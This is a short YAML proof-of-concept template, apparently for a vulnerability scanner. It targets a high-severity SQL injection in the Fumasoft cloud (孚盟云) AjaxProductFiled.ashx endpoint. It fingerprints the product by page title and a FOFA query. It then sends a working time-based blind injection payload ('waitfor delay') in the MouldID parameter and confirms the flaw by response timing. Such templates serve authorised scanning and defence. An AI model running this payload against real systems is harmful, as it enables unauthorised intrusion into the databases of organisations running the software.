id: poc-yaml-fumasoft-ajaxproductfiled-ashx-sqli
info:
  name: 孚盟云 AjaxProductFiled.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 孚盟云
  fofa: app="孚盟软件-孚盟云"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(title,"孚盟云")
- method: GET
  path: /m/Dingding/Ajax/AjaxProductFiled.ashx?method=savePuductFiled&MouldID=-1'waitfor%20delay'0:0:{{.t1}}'--
  expression: status_code == 200 && body == "" && duration > t1 && duration < t2
transport: http
